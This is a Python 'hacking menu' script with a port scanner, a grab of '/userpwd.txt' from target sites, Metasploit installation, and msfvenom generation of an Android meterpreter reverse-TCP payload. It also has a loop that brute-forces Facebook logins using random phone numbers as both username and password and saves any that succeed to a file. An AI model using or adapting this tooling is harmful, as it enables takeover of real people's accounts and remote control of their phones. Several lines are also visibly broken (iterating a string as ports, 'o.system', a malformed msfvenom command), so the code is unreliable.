#!/bin/python
import sys
import socket
import os
import requests
import random
import time
from datetime import datetime
import mechanicalsoup
def bann():
	print("""
		+-----------------+
		+		  +
		+  Mehdi Boullouf +
		+		  +
		+-----------------+
		+     Meta-Map    +
		+-----------------+
		      """)
def coma():
	print("""
	*************************************
	* [01] PorT Scanner[IP]             *
	* [02] GeT IP OF WebsiTe	    *
	* [03] PorT Scanner(WebsiTes)	    *
	* [04] HaCk WebsiTes		    *
	* [05] HaCk WiTh Payload(Metasploit)*
	* [06] InsTall MeTasploit	    *
	* [07] Crack FB AccounTs(100%)      *
	*************************************""")
def ps():
	#startswith
	#puts
	ip = input("EnTer IP :")
	try:
		lista = str([21,80,445,4444,23,8080,150,135])
		for port in lista:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			bx = s.connect_ex((ip,port))
			if bx == 0:
				res1 = ("Port"+port+":   open")
				print(res1)
			s.close()
	except Exception:
		print("Error ! Exiting...")
		sys.exit()
	except KeyboardInterrupt:
		print("[*] Exiting.....!")
		sys.exit()
def wi():
	import socket
	site = input("EnTer URL :")
	ip = socket.gethostbyname(site)
	print("IP of website is: "+ip)
def ws():
	#startswith
	#puts
	url = input("EnTer URL: :")
	print ("*")*55
	ip = socket.gethostbyname(url)
	print("Scanning "+ip)
	print("*")*55
	try:
		lista = str([21,80,445,4444,23,8080,150,135])
		for port in lista:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			bx=s.connect_ex((ip,port))
			if bx == 0:
				res1=("Port"+port+":   open")
				print(res1)
			s.close()
	# except Exception:
		# print("Error ! Exiting...")
		# sys.exit()
	except KeyboardInterrupt:
		print("[*] Exiting.....!")
		sys.exit()
def sl():
	url = input("EnTer URL :")
	req = requests.get(url+"/userpwd.txt")
	s = req.text
	print("proccesing..!")
	time.sleep(1)
	print(s)

def meni():
		print("""
			************************
			*		*
			* Programmed By Mehdi  *
			*		*
			************************""")
def com():
		print("""
			    ********
				* [05] *
				* [06] *
				* [07] *
				********""")
def meta():
	print(" You Must Be Patient Because :")
	print("Time : 2-3 hours ")
	print("Size : 200-300 MB")
	print("Size All Packages :500 - 600 mb")
	os.system("git clone https://github.com/rapid7/metasploit-framework")
	o.system("gem install bundle")
	os.system("bundle install")
	os.system("cd")
	os.system("cd metasploit-framework")
	os.system("./msfconsole")
def mp():
	os.system("cd")
	os.system("cd metasploit-framework")
	host = str(input("EnTer IP :"))
	name = input("EnTer Name OF PayLoad : ")
	os.system("./msfvenom android/meterpreter/reverse_tcp LHOST="+host+"LPORT=4444 -o"+ name)
##############################################
#Menu
bann()
coma()
try:
	while True:
		br = mechanicalsoup.StatefulBrowser()
		bx3 = input("Me6Bx3 >")
		if bx3 == "01":
			ps()
		if bx3 == "02":
			wi()
		if bx3 == "03":
			ws()
		if bx3 == "04":
			sl()
		if bx3 == "05":
			mp()
		if bx3 == "06":
			meta()
		if bx3 == "07":
			meni()
			com()
			num = input("EnTer Number :")
			br = mechanicalsoup.StatefulBrowser()
			while True:
				if num == "05":
					pw = str(random.randint(550000000,560000000))
				if num == "06":
					pw = str(random.randint(660000000,700000000))
				if num == "07":
					pw = str(random.randint(770000000,800000000))
				zer = str("0")
				br.open("https://mobile.facebook.com")
				br.select_form("#login_form")
				br['email'] = zer+pw
				br['pass'] = zer+pw
				print("Try ==>"+zer+pw)
				br.submit_selected(btnName="login")
				srs = br.get_url()
				if "save-device" in srs:
					print("Working ! Saved To Accounts.txt")
					o = open("Accounts.txt","a")
					o.write("\n"+zer+pw)
					o.close()
except Exception as e:
	print("Done!!")
				

			
		
			



					
		

	
		
	
	
		

	
	
	
	
	
			
				
			
		
	
